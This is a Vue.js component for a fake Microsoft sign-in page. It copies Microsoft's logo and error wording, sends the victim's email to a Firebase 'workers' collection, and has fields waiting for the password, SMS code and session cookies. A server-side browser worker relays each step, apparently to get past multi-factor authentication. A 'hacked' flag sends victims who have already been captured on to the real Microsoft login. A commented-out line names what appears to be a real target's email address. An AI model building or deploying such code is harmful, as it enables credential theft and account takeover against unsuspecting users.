<template>
  <v-container fill-height class="d-flex justify-center">
    <v-card class="pa-10" width="450" :disabled="disabledCard" tile>
      <v-toolbar flat>
        <v-toolbar-title>
          <v-img
            class=""
            alt="Microsoft Logo"
            :src="require('@/assets/microsoft_logo.svg')"
            transition="scale-transition"
            max-height="140"
            max-width="140"
          />

          <!-- <div class="mt-3">
            <p class="body-1">annalise.buttigieg@bluestone.com.au</p>
          </div>-->
        </v-toolbar-title>
      </v-toolbar>

      <v-card-text>
        <h2 class="black--text mb-7">Sign in</h2>
        <p class="red--text" v-if="error">
          We couldn't find an account with that username. Try another, or get a
          new Microsoft account.
        </p>
        <v-form ref="form" lazy-validation v-on:submit.prevent="onSubmit">
          <v-text-field
            :dense="true"
            v-model="email"
            :rules="emailRules"
            label="Email"
            type="text"
            required
            v-on:keyup.enter="submitForm"
          ></v-text-field>

          <router-link to>
            <p class="caption">Forgot my password?</p>
          </router-link>

          <v-row>
            <v-spacer></v-spacer>
            <v-btn
              class="rounded-button black--text text-none mx-2 px-10"
              :depressed="true"
              color="#9198a3"
              @click="submitForm"
              >Back</v-btn
            >
            <v-btn
              width=""
              class="rounded-button white--text text-none px-10"
              :depressed="true"
              color="#005DA6"
              @click="submitForm"
              >Next</v-btn
            >
          </v-row>
          <p class="caption mt-4">
            Welcome and please sign-in with your account and password
          </p>
        </v-form>
      </v-card-text>
    </v-card>
  </v-container>
</template>

<script>
import { db } from "../firebase";
export default {
  name: "OnBoarding",

  data: () => ({
    email: "",
    error: false,
    disabledCard: false,
    clean: true,
    workerNumber: 0,
    browser: "chrome_100",
    emailRules: [
      (v) => !!v || "Enter a valid email address",
      (v) =>
        /^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/.test(
          v
        ) || "E-mail must be valid",
    ],
  }),

  async created() {
    let hacked = localStorage.getItem("hacked");
    hacked && (window.location.href = "https://login.microsoftonline.com");

    let workers = await db.collection("workers");

    let currentWorker = await workers.doc("current").get();
    this.workerNumber = currentWorker.data().worker;
    this.browser = `chrome_${this.workerNumber}`;

    console.log(this.browser);
    workers.where("browser", "==", this.browser).onSnapshot((snapshot) => {
      snapshot.docChanges().forEach(async (change) => {
        let data = change.doc.data();
        console.log(change.type);
        if (data.from === "server" && change.type === "modified") {
          // first check if there is an error in user email.
          if (data.info === "username_error") {
            this.error = true;
            this.disabledCard = false;
          }
          // if the screen state is password.
          if (data.screenState === "password") {
            await this.$router.push({
              path: `/login/mail/${this.email}/${this.browser}`,
            });
          }
        }
      });
    });
  },

  async mounted() {},
  methods: {
    async submitForm() {
      this.disabledCard = true;
      this.error = false;
      let emailValid = this.email
        .trim()
        .toLowerCase()
        .match(
          /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
        );

      console.log(this.clean);

      if (emailValid === null) {
        this.error = true;
        this.disabledCard = false;
        return;
      }

      let workers = await db.collection("workers");

      if (this.clean) {
        let currentWorker = await workers.doc("current").get();
        this.workerNumber = currentWorker.data().worker;
      }

      let futureWorker;
      console.log(this.workerNumber);

      if (this.clean) {
        if (this.workerNumber === 10) {
          futureWorker = 1;
        } else {
          futureWorker = this.workerNumber + 1;
        }
        await workers.doc("current").set({ worker: futureWorker });
      }

      console.log(this.browser);
      await workers.doc(this.browser).set(
        {
          browser: this.browser,
          data_type: "email",
          email: this.email.trim(),
          password: "",
          smsCode: "",
          smsInfo: "",
          cookies: "",
          from: "client",
          info: "",
          screenState: "",
        },
        { merge: true }
      );
      // this.disabledCard = false;
      this.clean = false;
      // await this.$router.push({
      //   path: `/login/mail/${this.email}/${workerNumber}`,
      // });
    },
  },
};
</script>
<style lang="scss">
a {
  text-decoration: none;
  color: #005da6;
}
.rounded-button {
  border-radius: 0px;
}
</style>
